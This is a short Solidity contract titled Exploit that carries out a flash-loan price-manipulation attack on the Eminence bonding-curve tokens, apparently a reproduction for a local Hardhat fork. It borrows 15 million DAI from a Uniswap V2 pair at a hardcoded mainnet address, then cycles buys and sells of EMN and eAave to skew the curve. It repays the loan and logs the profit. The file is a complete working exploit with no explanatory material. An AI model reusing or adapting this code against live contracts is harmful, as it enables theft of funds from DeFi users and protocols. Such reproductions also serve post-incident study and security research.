//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IERC20.sol";

interface IEminence is IERC20 {
    function buy(uint _amount, uint _min) external returns (uint _bought);
    function sell(uint _amount, uint _min) external returns (uint _bought);
}

contract Exploit {
    IUniswapV2Pair pair = IUniswapV2Pair(0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11);
    IERC20 dai = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IEminence emn = IEminence(0x5ade7aE8660293F2ebfcEfaba91d141d72d221e8);
    IEminence eAave = IEminence(0xc08f38f43ADB64d16Fe9f9eFCC2949d9eddEc198);

    uint borrowedAmount = 15000000 * 10 ** 18;

    function run() external {
        pair.swap(borrowedAmount, 0, address(this), "0xab");
    }

    function uniswapV2Call(address, uint, uint, bytes calldata) external {
        dai.approve(address(emn), type(uint).max);
        emn.buy(borrowedAmount, 0);

        emn.approve(address(eAave), type(uint).max);
        uint emnBalance = emn.balanceOf(address(this));
        eAave.buy(emnBalance/2, 0);

        uint emnBalance2 = emn.balanceOf(address(this));
        emn.sell(emnBalance2, 0);

        eAave.sell(eAave.balanceOf(address(this)), 0);
        uint emnBalance3 = emn.balanceOf(address(this));
        emn.sell(emnBalance3, 0);

        dai.transfer(address(pair), (borrowedAmount * 1000) / 997 + 1);

        console.log(dai.balanceOf(address(this)) / 1 ether);
    }
}
